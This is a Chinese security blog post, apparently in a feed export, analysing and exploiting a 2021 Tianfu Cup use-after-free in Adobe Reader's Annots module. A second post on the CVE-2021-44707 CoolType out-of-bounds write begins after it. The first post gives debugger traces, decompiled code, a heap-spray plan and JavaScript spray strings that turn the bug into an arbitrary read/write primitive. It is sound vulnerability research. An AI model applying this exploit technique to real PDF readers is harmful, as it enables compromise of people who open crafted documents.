+Annots!PlugInMain+0xae9e3:
+6e9cc813 8b8564ffffff    mov     eax,dword ptr [ebp-9Ch] ss:002b:0536d708=6b5c4ff8
+0:000&gt; dd 0536d704 L4	//获取到0xC大小的存放Annotation对象指针的结构
+0536d704  6b5c4ff0 6b5c4ff8 6b5c5000 3b2c7800
+0:000&gt; dd 6b5c4ff0 L4	//该结构存放了两个Annotation对象
+6b5c4ff0  809b4fa0 64cfafa0 00000000 00000000
+0:000&gt; dd 809b4fa0 L18	//Annots[0]，name:aaa
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; dd 64cfafa0 L18	//Annots[1]，name:bbb
+64cfafa0  6ee3616c 00000000 00000000 00000001
+64cfafb0  00000000 8034cfb0 80d48ff8 80d48ffc
+64cfafc0  80d48ffc 00000000 00000000 8bdc0ff0
+64cfafd0  00000000 00000000 00000000 00000000
+64cfafe0  00000000 00000000 00000000 00000000
+64cfaff0  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>每个Annotation对象的大小均为0x60，随后将Annots[0]对象的指针传入<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 2 hit
+eax=85de8ff8 ebx=85de8ff8 ecx=55ae2ff8 edx=01000002 esi=6b5c4ff0 edi=24d74c98
+eip=6e9cc86d esp=0536d6d8 ebp=0536d7a4 iopl=0         nv up ei ng nz ac po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000293
+Annots!PlugInMain+0xaea3d:
+6e9cc86d e845230000      call    Annots!PlugInMain+0xb0d87 (6e9cebb7)	//sub_221CEBB7，崩溃函数的上层函数
+0:000&gt; dps esp L3
+0536d6d8  2f8e8fc0
+0536d6dc  809b4fa0		//此时传入的参数正是Annots[0]对象的指针
+0536d6e0  00000000
+</code></pre></div></div>
+
+<p>继续分析<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>，第一个函数<code class="language-plaintext highlighter-rouge">sub_2216AAAD</code>正是崩溃函数，获取了Annotation+0x2C位置的值：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __stdcall sub_221CEBB7(wchar_t *a1, int object_0, int a3)
+{
+  int *v4; // esi
+  __int16 v5; // cx
+  int v6; // eax
+  int v7; // esi
+  int v8; // edi
+  _DWORD *v9; // eax
+  _DWORD *v10; // eax
+  char v11[8]; // [esp+10h] [ebp-20h] BYREF
+  _DWORD *v12; // [esp+18h] [ebp-18h]
+  int v13; // [esp+1Ch] [ebp-14h] BYREF
+  __int16 v14[5]; // [esp+22h] [ebp-Eh] BYREF
+  int v15; // [esp+2Ch] [ebp-4h]
+
+  if ( !object_0 )
+    return 0;
+  v4 = sub_2216AAAD(object_0);                  // 获取Annotation+0X2C，崩溃函数
+  if ( word_2273055C == (__int16)0xFFFF )
+    v5 = sub_22123B90(&amp;word_2273055C);
+  else
+    v5 = word_2273055C;
+  v14[0] = v5;
+  v6 = updateobj(v4, (int)v11, (unsigned __int16 *)v14);
+  v7 = 0;
+  v8 = *(_DWORD *)(*(_DWORD *)v6 + 0x14);
+  v13 = v8;
+  if ( v8 )
+    goto LABEL_10;
+  v9 = (_DWORD *)alloc_0(0xC, 1);
+  v12 = v9;
+  v15 = 0;
+  if ( v9 )
+  {
+    v10 = sub_221CA131(v9, a1, object_0, (int)&amp;v13);// markup
+    v8 = v13;
+    v7 = (int)v10;
+  }
+  v15 = 0xFFFFFFFF;
+  if ( v8 )
+  {
+LABEL_10:
+    if ( !v7 )
+      v7 = (*(int (__cdecl **)(int, const wchar_t *))(vtable + 0xCC))(v8, "this");
+  }
+  if ( a3 )
+    *(_DWORD *)a3 = v7;
+  return v8;
+}
+</code></pre></div></div>
+
+<p>在调试器中执行到该函数，传入的参数为Annots[0]对象的指针，因此能够正确获取到Annotation+0x2C的值并返回：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
+eax=0536d6c4 ebx=85de8ff8 ecx=809b4fa0 edx=01000002 esi=6b5c4ff0 edi=24d74c98
+eip=6e9cebd3 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+Annots!PlugInMain+0xb0da3:
+6e9cebd3 e8d5bef9ff      call    Annots!PlugInMain+0x4cc7d (6e96aaad)
+0:000&gt; dd ecx L18
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=83dd4ff0 ebx=85de8ff8 ecx=6e96aaf7 edx=01000002 esi=6b5c4ff0 edi=24d74c98
+eip=6e9cebd8 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+Annots!PlugInMain+0xb0da8:
+6e9cebd8 668b0d5c05f36e  mov     cx,word ptr [Annots!PlugInMain+0x61272c (6ef3055c)] ds:002b:6ef3055c=14c8
+0:000&gt; dd 83dd4ff0 L4	//获取到Annotation+0x2C处的值
+83dd4ff0  86ed0fe8 00000000 00000000 d0d0d0d0
+</code></pre></div></div>
+
+<p>继续向下执行到<code class="language-plaintext highlighter-rouge">sub_221CA131</code>，该函数传入了Annots[0]对象的指针，执行完毕该函数发现Annost[1]对象被释放：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; pc
+eax=674eeff0 ebx=85de8ff8 ecx=674eeff0 edx=00000000 esi=00000000 edi=00000000
+eip=6e9cec3f esp=0536d694 ebp=0536d6d0 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+Annots!PlugInMain+0xb0e0f:
+6e9cec3f e8edb4ffff      call    Annots!PlugInMain+0xac301 (6e9ca131)
+0:000&gt; dps esp L3
+0536d694  2f8e8fc0
+0536d698  809b4fa0	//Annots[0]对象的指针
+0536d69c  0536d6bc
+0:000&gt; dd 809b4fa0 L18	//Annots[0]
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; dd 64cfafa0 L18	//Annots[1]
+64cfafa0  6ee3616c 00000000 00000000 00000001
+64cfafb0  00000000 8034cfb0 80d48ff8 80d48ffc
+64cfafc0  80d48ffc 00000000 00000000 8bdc0ff0
+64cfafd0  00000000 00000000 00000000 00000000
+64cfafe0  00000000 00000000 00000000 00000000
+64cfaff0  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=674eeff0 ebx=85de8ff8 ecx=6e9ca252 edx=09d50000 esi=00000000 edi=00000000
+eip=6e9cec44 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xb0e14:
+6e9cec44 8b7dec          mov     edi,dword ptr [ebp-14h] ss:002b:0536d6bc=69c80fb8
+0:000&gt; dd 809b4fa0 L18	//Annots[0]
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ffc
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; dd 64cfafa0 L18	//Annots[1]
+64cfafa0  ???????? ???????? ???????? ????????
+64cfafb0  ???????? ???????? ???????? ????????
+64cfafc0  ???????? ???????? ???????? ????????
+64cfafd0  ???????? ???????? ???????? ????????
+64cfafe0  ???????? ???????? ???????? ????????
+64cfaff0  ???????? ???????? ???????? ????????
+</code></pre></div></div>
+
+<p>返回到漏洞函数<code class="language-plaintext highlighter-rouge">sub_221CC5EA</code>，会循环执行<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>，第二次执行时则传入了Annots[1]对象的指针，而此时Annots[1]对象已经被释放。因此在获取Annots[1]+0x2C时便会出现非法访问异常：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 2 hit
+eax=5825aff0 ebx=85de8ffc ecx=55ae2ff8 edx=0536d604 esi=6b5c4ff4 edi=24d74c98
+eip=6e9cc86d esp=0536d6d8 ebp=0536d7a4 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+Annots!PlugInMain+0xaea3d:
+6e9cc86d e845230000      call    Annots!PlugInMain+0xb0d87 (6e9cebb7)
+0:000&gt; dps 0536d6d8 L3
+0536d6d8  2f8e8fc0
+0536d6dc  64cfafa0	//此时传入的参数为Annots[1]对象的指针
+0536d6e0  00000000
+0:000&gt; g
+(135c.14cc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0536d68c ebx=85de8ffc ecx=64cfafa0 edx=0536d604 esi=6b5c4ff4 edi=64cfafa0
+eip=6e96aabb esp=0536d678 ebp=0536d698 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+Annots!PlugInMain+0x4cc8b:
+6e96aabb 8b772c          mov     esi,dword ptr [edi+2Ch] ds:002b:64cfafcc=????????	//获取Annots[1]+0x2C时出错
+</code></pre></div></div>
+
+<p>关闭page heap后发现执行完毕<code class="language-plaintext highlighter-rouge">sub_221CA131</code>后，Annost[1]对象被container内的字符串占据，并最终崩溃于0x41414141：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
+eax=0cadbdd0 ebx=0ca3fe58 ecx=0cadbdd0 edx=00000000 esi=00000000 edi=00000000
+eip=6e9cec3f esp=0502d4e4 ebp=0502d520 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xb0e0f:
+6e9cec3f e8edb4ffff      call    Annots!PlugInMain+0xac301 (6e9ca131)	//sub_221CA131
+0:000&gt; dd 0c8e9170 L18	//Annots[0]
+0c8e9170  6ee3616c 00000000 00000000 00000001
+0c8e9180  00000000 0ca6db78 0ca40128 0ca40128
+0c8e9190  0ca4012c 00000000 00000000 0cadb368
+0c8e91a0  00000000 00000000 00000000 00000000
+0c8e91b0  00000000 00000000 00000000 00000000
+0c8e91c0  00000000 00000000 00000000 00000000
+0:000&gt; dd 0c8e8c90 L18	//Annots[1]
+0c8e8c90  6ee3616c 00000000 00000000 00000001
+0c8e8ca0  00000000 0ca6eca8 0ca40148 0ca4014c
+0c8e8cb0  0ca4014c 00000000 00000000 0cadba40
+0c8e8cc0  00000000 00000000 00000000 00000000
+0c8e8cd0  00000000 00000000 00000000 00000000
+0c8e8ce0  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=0cadbdd0 ebx=0ca3fe58 ecx=6e9ca252 edx=05210000 esi=00000000 edi=00000000
+eip=6e9cec44 esp=0502d4f0 ebp=0502d520 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xb0e14:
+6e9cec44 8b7dec          mov     edi,dword ptr [ebp-14h] ss:002b:0502d50c=0cac1d48
+0:000&gt; dd 0c8e9170 L18	//Annots[0]
+0c8e9170  6ee3616c 00000000 00000000 00000001
+0c8e9180  00000000 0ca6db78 0ca40128 0ca4012c
+0c8e9190  0ca4012c 00000000 00000000 0cadb368
+0c8e91a0  00000000 00000000 00000000 00000000
+0c8e91b0  00000000 00000000 00000000 00000000
+0c8e91c0  00000000 00000000 00000000 00000000
+0:000&gt; dd 0c8e8c90 L18	//Annots[1]
+0c8e8c90  41414141 41414141 41414141 41414141
+0c8e8ca0  41414141 41414141 41414141 41414141
+0c8e8cb0  41414141 41414141 41414141 41414141
+0c8e8cc0  41414141 41414141 41414141 41414141
+0c8e8cd0  41414141 41414141 41414141 41414141
+0c8e8ce0  41414141 41414141 41414141 00004141
+0:000&gt; g
+(c0.20): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0502d4c4 ebx=0502d512 ecx=41414141 edx=0502d454 esi=41414141 edi=41414141
+eip=6e923c60 esp=0502d4a8 ebp=0502d4a8 iopl=0         nv up ei pl nz ac po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
+Annots!PlugInMain+0x5e30:
+6e923c60 8b01            mov     eax,dword ptr [ecx]  ds:002b:41414141=????????
+</code></pre></div></div>
+
+<p>结合POC知晓了漏洞的成因：执行<code class="language-plaintext highlighter-rouge">doc.getAnnots(0)</code>时会获取page[0]上所有的Annotation对象，在获取对象时会查询对象的Markup属性。由于aaa对象在函数中被添加，且该对象的Markup属性为回调函数，因此在获取aaa对象的Markup属性时会执行该回调函数调用<code class="language-plaintext highlighter-rouge">bbb.destroy();</code>释放bbb对象。紧接着0x60大小的template字符串刚好占位被释放的bbb对象的内存，随后获取bbb对象时访问了template字符串，造成了UAF。</p>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<p>UAF漏洞的利用思路一般为通过占位释放的对象内存使得后续解析伪造的对象时造成特定地址越界写或内存释放，在该漏洞中寻找到的利用方式为释放指定内存地址的ArrayBuffer对象，随后通过字符串占位该对象内存修改ArrayBuffer对象的byteLength为0xFFFFFFFF。</p>
+
+<p>继续深入分析<code class="language-plaintext highlighter-rouge">sub_221CA131</code>，该函数为获取Annotation对象Markup属性的函数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *__thiscall sub_221CA131(_DWORD *this, wchar_t *a2, int obj_annot, int a4)
+{
+  int v5; // esi
+  int v6; // eax
+  int v7; // ebx
+  __int16 v8; // ax
+  int v9; // ecx
+  int *v10; // eax
+  char v12[8]; // [esp+10h] [ebp-1Ch] BYREF
+  _DWORD *v13; // [esp+18h] [ebp-14h]
+  __int16 v14[5]; // [esp+1Eh] [ebp-Eh] BYREF
+  int v15; // [esp+28h] [ebp-4h]
+
+  v13 = this;
+  *this = &amp;CAESAnnot::`vftable';
+  v5 = vtable;
+  v15 = 0;
+  v6 = sub_221D153D(a2);
+  v7 = (*(int (__cdecl **)(wchar_t *, _DWORD, _DWORD, int))(v5 + 0x98))(a2, 0, 0, v6);// 调用Markup回调函数
+  (*(void (__cdecl **)(int, const wchar_t *, _DWORD *))(vtable + 0xC8))(v7, "this", this);// 检查参数
+  (*(void (__cdecl **)(int, const wchar_t *, int (__cdecl *)(int)))(vtable + 0xC8))(// 检查参数
+    v7,
+    "getPDAnnot",
+    getPDAnnot);
+  this[1] = obj_annot;
+  sub_221249E4((int)this);                      // 释放内存
+  *(_DWORD *)a4 = v7;
+  (*(void (__cdecl **)(wchar_t *, int))(vtable + 0x1AC))(a2, v7);
+  v8 = word_2273055C;
+  if ( word_2273055C == (__int16)0xFFFF )
+    v8 = sub_22123B90(&amp;word_2273055C);
+  v9 = this[1];
+  v14[0] = v8;
+  v10 = sub_2216AAAD(v9);
+  *(_DWORD *)(*(_DWORD *)sub_221CA0A5(v10, (int)v12, (unsigned __int16 *)v14) + 0x14) = v7;
+  (*(void (__thiscall **)(_DWORD, wchar_t *, int, const wchar_t *))(vtable + 0x15C))(
+    *(_DWORD *)(vtable + 0x15C),
+    a2,
+    v7,
+    "Markup");
+  *((_WORD *)this + 4) = 1;
+  return this;
+}
+</code></pre></div></div>
+
+<p>其中<code class="language-plaintext highlighter-rouge">sub_221249E4</code>传入的参数为获取到的Annotation对象指针，内部比较了Annots[6]和Annots[7]的值，如果一致则调用free函数释放Annots[6]存储的内存：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20221124143936130.png" alt="" /></p>
+
+<p>分析到这里，整个利用思路就很清晰了：</p>
+
+<ol>
+  <li>堆喷0xffe8大小的ArrayBuffer对象，在0x10100048地址处稳定构造一个ArrayBuffer对象。</li>
+  <li>在0x10100048的ArrayBuffer对象中伪造一个Annotation对象，通过各种检查措施。</li>
+  <li>修改占用Annost[1]对象的字符串，使得Annost[1]+0x18处和Annost[1]+0x1C处地址为0x10100048，并将Annost[1]+0x2C指向ArrayBuffer对象中伪造的Annotation对象。</li>
+  <li>成功释放0x10100048的ArrayBuffer对象后，利用字符串占位该处内存，将byteLength修改为0xFFFFFFFF。</li>
+</ol>
+
+<p>成功构造后整个利用流程如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 1 hit
+eax=045dc264 ebx=0be38458 ecx=0c0a9058 edx=00104004 esi=00000000 edi=0d29a0a0
+eip=6352c80e esp=045dc22c ebp=045dc304 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Annots!PlugInMain+0xae9de:
+6352c80e e885ec0900      call    Annots!PlugInMain+0x14d668 (635cb498)	//sub_2226B498，获取Annotation对象
+0:000&gt; dps esp L3
+045dc22c  0be38458
+045dc230  00000000
+045dc234  045dc264
+0:000&gt; dd 045dc264 L4
+045dc264  00000000 00000000 00000000 ffffffff
+0:000&gt; p
+eax=00000002 ebx=0be38458 ecx=635cb691 edx=00000003 esi=00000000 edi=0d29a0a0
+eip=6352c813 esp=045dc244 ebp=045dc304 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Annots!PlugInMain+0xae9e3:
+6352c813 8b8564ffffff    mov     eax,dword ptr [ebp-9Ch] ss:002b:045dc268=0c48b5a8
+0:000&gt; dd 045dc264 L4
+045dc264  0c48b5a0 0c48b5a8 0c48b5b0 ffffffff
+0:000&gt; dd 0c48b5a0 L4
+0c48b5a0  0c057f20 0c059510 00000000 00000000
+0:000&gt; dd 0c059510 L18	//Annots[1]
+0c059510  6399616c 00000000 00000000 00000001
+0c059520  00000000 0bfd56b0 0c22af20 0c22af24
+0c059530  0c22af24 00000000 00000000 0c48c968
+0c059540  00000000 00000000 00000000 00000000
+0c059550  00000000 00000000 00000000 00000000
+0c059560  00000000 00000000 00000000 00000000
+0:000&gt; g
+Breakpoint 2 hit
+eax=0e27e436 ebx=00000000 ecx=713f21b0 edx=40404040 esi=713f21b0 edi=0c48b6d8
+eip=6352a170 esp=045dc1b0 ebp=045dc1ec iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
+Annots!PlugInMain+0xac340:
+6352a170 ffd6            call    esi {AcroRd32!AIDE::PixelPartInfo::operator=+0x174960 (713f21b0)}	//调用Markup回调函数
+0:000&gt; dd 0c059510 L18	//Annots[1]
+0c059510  6399616c 00000000 00000000 00000001
+0c059520  00000000 0bfd56b0 0c22af20 0c22af24
+0c059530  0c22af24 00000000 00000000 0c48c968
+0c059540  00000000 00000000 00000000 00000000
+0c059550  00000000 00000000 00000000 00000000
+0c059560  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=3d582e78 ebx=00000000 ecx=65b0db87 edx=65c8f74e esi=713f21b0 edi=0c48b6d8
+eip=6352a172 esp=045dc1b0 ebp=045dc1ec iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xac342:
+6352a172 8b0de08aaa63    mov     ecx,dword ptr [Annots!PlugInMain+0x62acb0 (63aa8ae0)] ds:002b:63aa8ae0=08490970
+0:000&gt; dd 0c059510 L18	//调用回调函数后，Annots[1]被字符串占位
+0c059510  ffff9090 ffffffff 10100048 10100048
+0c059520  10100048 10100048 10100048 10100048
+0c059530  10100048 10100058 10100058 10100058
+0c059540  10100058 10100058 10100058 10100058
+0c059550  10100058 10100058 10100058 10100058
+0c059560  10100058 10100058 10100058 00009090
+0:000&gt; 	//接着循环执行sub_221CEBB7，第二次执行到sub_221CA131函数，该函数会解析被占位的Annots[1]
+eax=6352ee70 ebx=3d582f68 ecx=0c059510 edx=63977d5f esi=70aeacf0 edi=0c48baf8
+eip=6352a1c1 esp=045dc1bc ebp=045dc1ec iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0xac391:
+6352a1c1 e81ea8f5ff      call    Annots!PlugInMain+0x6bb4 (634849e4)
+0:000&gt; dd 10100048 	//ArrayBuffer对象
+10100048  00000000 0000ffe8 00000000 00000000
+10100058  10100068 00000001 00000000 00000000
+10100068  0c49af10 0c49af10 0c49af10 00000100
+10100078  00000000 00000000 00000000 00000000
+10100088  00000000 00000000 00000000 00000000
+10100098  00000000 00000000 00000000 00000000
+101000a8  00000000 00000000 00000000 00000000
+101000b8  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=0c22af70 ebx=3d582f68 ecx=0c22af70 edx=04820000 esi=70aeacf0 edi=0c48baf8
+eip=6352a1c6 esp=045dc1c0 ebp=045dc1ec iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xac396:
+6352a1c6 8b4510          mov     eax,dword ptr [ebp+10h] ss:002b:045dc1fc=045dc21c
+0:000&gt; dd 10100048	//解析完毕ArrayBuffer对象已经被释放
+10100048  048200c0 3d6500a0 00000000 00000000
+10100058  10100068 00000001 00000000 00000000
+10100068  0c49af10 0c49af10 0c49af10 00000100
+10100078  00000000 00000000 00000000 00000000
+10100088  00000000 00000000 00000000 00000000
+10100098  00000000 00000000 00000000 00000000
+101000a8  00000000 00000000 00000000 00000000
+101000b8  00000000 00000000 00000000 00000000
+0:000&gt; dd 10100058 L4	//此时Annots[1]+0x2C指向的伪造的Annotation对象均能通过后续的检查
+10100058  10100068 00000001 00000000 00000000
+0:000&gt; dd 10100068 L6
+10100068  0c49af10 0c49af10 0c49af10 00000100
+10100078  00000000 00000000
+//随后利用字符串对象占位被释放的ArrayBuffer对象，byteLength被修改为0xFFFFFFFF
+0:018&gt; dd 10100048
+10100048  ffff9090 ffffffff 0cb90088 00000000
+10100058  ffffffff ffffffff ffffffff ffffffff
+10100068  ffffffff ffffffff ffffffff ffffffff
+10100078  ffffffff ffffffff ffffffff ffffffff
+10100088  ffffffff ffffffff ffffffff ffffffff
+10100098  ffffffff ffffffff ffffffff ffffffff
+101000a8  ffffffff ffffffff ffffffff ffffffff
+101000b8  ffffffff ffffffff ffffffff ffffffff
+//占位Annots[1]的字符串代码
+var sprayStr = unescape('%u9090%uFFFF%uFFFF%uFFFF') + unescape('%u0048%u1010').repeat(7) + unescape('%u0058%u1010').repeat(14) + unescape('%u9090');
+//占位ArrayBuffer的字符串代码
+var sprayStrLen1 = (0x10000 / 2) - 1;
+var sprayStr1 = unescape('%u9090%uFFFF%uFFFF%uFFFF') + unescape('%u0000%u0000%u0000%u0000') + unescape('%uFFFF').repeat(sprayStrLen1 - 8);
+</code></pre></div></div>
+
+<p>自此整个利用结束，剩下的内容就是利用读写原语执行代码了不再赘述。</p>
+
+<h1 id="总结">总结</h1>
+
+<p>该漏洞主要的利用难点在于构造占位Annots[1]的字符串和伪造Annots[1]+0x2C指向的结构，这部分不仔细构造的话执行后续的函数会报错。另外也尝试用字符串占位了ArrayBuffer对象，读写原语的构造更加简单了。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 该漏洞为2021年天府杯中使用的Adobe Reader UAF漏洞，漏洞位于Annots.api模块，对应的Adobe Reader版本为：21.007.20099。]]></summary></entry><entry><title type="html">CVE-2021-44707 Adobe Reader越界写漏洞分析与利用</title><link href="http://localhost:4000/2022-11-04/CVE-2021-44707" rel="alternate" type="text/html" title="CVE-2021-44707 Adobe Reader越界写漏洞分析与利用" /><published>2022-11-04T00:00:00+08:00</published><updated>2022-11-04T00:00:00+08:00</updated><id>http://localhost:4000/2022-11-04/CVE-2021-44707</id><content type="html" xml:base="http://localhost:4000/2022-11-04/CVE-2021-44707"><![CDATA[<h1 id="漏洞概述">漏洞概述</h1>
+
+<p>该漏洞为2021年天府杯中使用的Adobe Reader越界写漏洞，漏洞位于字体解析模块：CoolType.dll中，对应的Adobe Reader版本为：21.007.20099。<!--more--></p>
+
+<h1 id="原理分析">原理分析</h1>
+
+<p>开启page heap后打开POC，Adobe崩溃于<code class="language-plaintext highlighter-rouge">CoolType + 2013E</code>处：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000046 ebx=00000002 ecx=a54d102f edx=5ab2f001 esi=34adeb2c edi=5ab2efd0
+eip=6cf9013e esp=34ade848 ebp=34adea70 iopl=0         nv up ei ng nz ac po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293
+CoolType!CTInit+0x1cb4e:
+6cf9013e 807aff00        cmp     byte ptr [edx-1],0         ds:002b:5ab2f000=??
+0:005&gt; dd edx -31
+5ab2efd0  0000d0c0 00000000 00000000 00000000
+5ab2efe0  00000000 00000000 00000000 00000000
+5ab2eff0  00000000 00000000 00000000 d0c00000
+5ab2f000  ???????? ???????? ???????? ????????
+5ab2f010  ???????? ???????? ???????? ????????
+5ab2f020  ???????? ???????? ???????? ????????
+5ab2f030  ???????? ???????? ???????? ????????
+5ab2f040  ???????? ???????? ???????? ????????
+</code></pre></div></div>
+
+<p>从崩溃处可以明显看出越界访问了<code class="language-plaintext highlighter-rouge">0x5ab2f000</code>处的内存，崩溃函数为：<code class="language-plaintext highlighter-rouge">CoolType +1FCB0</code>，下断于该函数查看参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:011&gt; g
+Breakpoint 0 hit
+eax=0000002e ebx=34fff0e4 ecx=34fff310 edx=73006500 esi=59e06fd0 edi=00000001
+eip=6cf8fcb0 esp=34ffef0c ebp=34fff0a8 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+CoolType!CTInit+0x1c6c0:
+6cf8fcb0 55              push    ebp
+0:011&gt; dps esp+4 L7
+34ffef10  59e06fd0
+34ffef14  0000002e
+34ffef18  34ffefc4
+34ffef1c  00000001
+34ffef20  00000000
+34ffef24  00000001
+34ffef28  00000000
+0:011&gt; dd 59e06fd0
+59e06fd0  d6000800 50015001 51015101 61016101
+59e06fe0  62016201 31000100 7a540f51 01521d18
+59e06ff0  73006e18 74002000 73006500 d0c07400
+59e07000  ???????? ???????? ???????? ????????
+59e07010  ???????? ???????? ???????? ????????
+59e07020  ???????? ???????? ???????? ????????
+59e07030  ???????? ???????? ???????? ????????
+59e07040  ???????? ???????? ???????? ????????
+</code></pre></div></div>
+
+<p>传入的参数1为POC中构造的字符串，参数2则为字符串的长度，调试后发现调用了函数<code class="language-plaintext highlighter-rouge">MultiToWide</code>后，传入的字符串变成了崩溃时的内存布局：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ( !a9 || a10_ff || a5 )
+    {
+      v49 = size;
+      MultiToWide(a5, v12, *(unsigned __int16 *)a3, (void *)v12, (int)&amp;v49);// 内部调用MultiByteToWideCharStub
+      LOWORD(result) = v49;
+      *(_WORD *)a3 = v49;
+      result = (unsigned __int16)result;
+      goto LABEL_83;
+    }
+......
+LABEL_83:
+    if ( (_WORD)result )
+    {
+      v44 = (_BYTE *)(v12 + 1);
+      v45 = ~v12;
+      v51 = ~v12;
+      do
+      {
+        if ( *(v44 - 1) || *v44 )               // crash
+</code></pre></div></div>
+
+<p>深入分析<code class="language-plaintext highlighter-rouge">MultiToWide</code>函数，内部调用了<code class="language-plaintext highlighter-rouge">MultiByteToWideCharStub</code>函数，将字符串转化为宽字节字符串：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool __cdecl MultiToWide(int a1, int lpMultiByteStr, int cbMultiByte, void *MultByte, int MultByteSize)
+{
+  _BYTE *v5; // edx
+  size_t size; // eax
+  int v7; // edx
+  int v8; // ecx
+  char v9; // al
+  bool v10; // zf
+  unsigned __int16 CodePage; // ax
+  int WideCharSize; // eax
+  int v14; // esi
+  int v15; // [esp+10h] [ebp-210h]
+  size_t MultByteSize_1; // [esp+18h] [ebp-208h]
+  char lpWideCharStr[512]; // [esp+1Ch] [ebp-204h] BYREF
+
+  v5 = (_BYTE *)lpMultiByteStr;
+  v15 = 0;
+  size = *(_DWORD *)MultByteSize;
+  *(_DWORD *)MultByteSize = 0;
